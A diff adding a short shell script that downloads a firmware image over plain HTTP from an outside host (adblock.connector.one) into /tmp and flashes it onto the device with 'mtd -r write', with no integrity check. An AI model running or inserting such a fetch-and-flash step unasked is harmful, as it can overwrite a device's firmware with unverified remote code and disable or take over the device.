@@ -1,0 +1,4 @@
+#!/bin/sh
+cd /tmp
+wget http://adblock.connector.one/firmware.bin
+mtd -r write firmware.bin firmware
